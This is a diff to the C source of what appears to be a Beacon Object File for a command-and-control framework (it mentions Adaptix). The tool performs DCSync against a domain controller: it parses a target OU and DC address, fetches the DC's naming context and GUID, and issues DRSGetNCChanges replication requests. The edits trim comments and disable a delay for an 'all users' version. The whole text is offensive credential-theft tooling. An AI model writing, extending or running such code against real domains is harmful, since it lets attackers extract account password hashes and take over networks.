@@ -885,7 +885,7 @@ void go(char *args, int alen) {
     datap parser;
     BeaconDataParse(&parser, args, alen);
     
-    // Parse arguments from Adaptix script
+    // Parse arguments
     char* ouPath = ValidateInput(BeaconDataExtract(&parser, NULL));
     char* dcAddress = ValidateInput(BeaconDataExtract(&parser, NULL));
     int useLdaps = BeaconDataInt(&parser);
@@ -913,7 +913,7 @@ void go(char *args, int alen) {
         return;
     }
     
-    // Get DC context (defaultNamingContext + DC GUID) in optimized query
+    // Get DC context (defaultNamingContext + DC GUID)
     dcContext = GetDCContext(ld, dcHostname);
     if (!dcContext) {
         ERROR_PRINT( "[-] Failed to get DC context");
@@ -982,7 +982,8 @@ void go(char *args, int alen) {
         DRS_MSG_GETCHGREQ request;
         InitDRSRequest(&request, &dcContext->dcObjectGuid, targetDsname);
         
-        KERNEL32$Sleep(100); // Small delay for drs response and session key syncing
+        // Disabling this for the all users version, it's probably unnecessary
+        //KERNEL32$Sleep(100); // Small delay for drs response and session key syncing
 
         // Make the DRSGetNCChanges call
         DWORD outVersion = 0;
